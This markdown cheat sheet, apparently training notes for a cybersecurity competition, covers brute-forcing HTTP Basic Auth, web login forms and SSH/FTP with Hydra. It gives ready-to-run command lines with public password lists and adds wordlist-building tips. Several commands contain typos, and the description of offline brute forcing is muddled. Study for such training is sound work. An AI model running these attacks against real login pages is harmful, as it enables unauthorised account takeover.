<[Back to Main Page](https://github.com/ChristopherFitzsimons/WorldSkills2022Cybersecurity)

# Brute Forcing Login Forms
Created by Bujitha Ponsuge



# Commands
The Following are commands that you can use with Hydra to brute force an Basic HTTP Auth Form

## Brute Forcing Basic HTTP Auth Forms Using Default Credentials using Hydra
|	Options		|	Description	|
|-----------|:-----------|
|-C |Allows to use Combined Wordlists|
|http-get|	This is the Request Method						|
|/| The Target Path

Combined Wordlist

```console
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <Target IP> -s <PORT> http-get /
```

Username/Password Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

Username Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -p <PASSWORD> -u -f Target IP> -s <PORT> http-get /
```

Password Brute Force

```console
hydra -l <USERNAME> -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f Target IP> -s <PORT> http-get /
```

# Web Forms/Login Forms Brute Forcing using **Hydra**

Following Commands are useful to brute force Login Forms (Admin Panels etc..) using the Hydra Module <font color=lightgreen> **http[s]-post-form**</font> 

> To Determine if the **http[s]-post-form** is the correct module to use. Type something into the login form and check if the URL has any of the inputs that you put in or if the URL change in anyway, If the URL does not change then the Web Application will be using an POST form. If the URL change and or have any of our inputs then its an GET form.
> 

Combined Wordlist

```console
hydra -c /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```

Username/Password Brute Force

```console
hydra -L /usr/share/SecLists/Usernames/Names/names.txt -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```

Password Brute Force

> NOTE: Try default usernames that are often used in admin panels.
>  admin,administrator,wpadmin, root etc.

```console
hydra -l admin -P /usr/share//SecLists/Passwords/Leaked-Databases/rockyou.txt <Target IP> -s <Target Port> http-post-form "/login.php:user=^USER^&pass="^PASS^:[Success or Failed String]
```
# PLACEHOLDER

# Useful Commands
The following commands can help if you want to create a personalized wordlist


```console
sed -ri '/^.{,7}$/d' file.txt
```
This command will remove anything that is shorter than eight characters 
```console
sed -ri '/[!-/:-@\[-`\{-~]+/!d' file.txt
```
This command will remove anything that does not contain special characters
```console
sed -ri '/[0-9]+/!d' file.txt
```
This will remove anything that has no numbers

```console
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Name-of-target > file.txt
```

This tool can be used to create a custom username wordlist, using an name of an user.

# Service Authentication Brute Forcing (SSH & FTP)

[!] Use This command if you created an world-list and password-list based of an username.
```console
hydra -L username-list -P password-list -u -f ssh://<TargetIP:Port> -t 4 
```

```console
hydra -l username-list -P password-list ftp://<FTPIP>
```

## Notes

Brute Forcing is basically an method of attempting to attackers trying many passwords and usernames with hopes of eventually guessing the correct one using specialized tools and public wordlists that contains default passwords and usernames that are used by many users.

Since most passwords are not stored in clear text documents but instead hashed as hash values on files, an Brute Force needs to go through a list of passwords and try to match them with an hash value and once the hash value has been matched it would then essentially show them to the attacker to use. This is called offline brute-forcing.

The Above commands are used for online brute-forcing and is mainly used for brute forcing website's login forms.
Since most Websites would always have an login area for users including administrators, either hidden or in plain sight in some if not most cases, and since most usernames can be recognized easily and since majority of users wont use complex passwords since its harder to remember, it allows attackers to easily gain access into accounts as long as proper enumeration is done so they can get an good grip on it's system.

Variety of tools and methods can be used for login brute forcing such as:

- Hydra
- Medusa
- john the Ripper
- wfuzz

and many more.

Many web servers that are currently active still uses BAsic HTTP AUTH scheme, which is essentials transmits credentials and passwords using Base64 encodings.
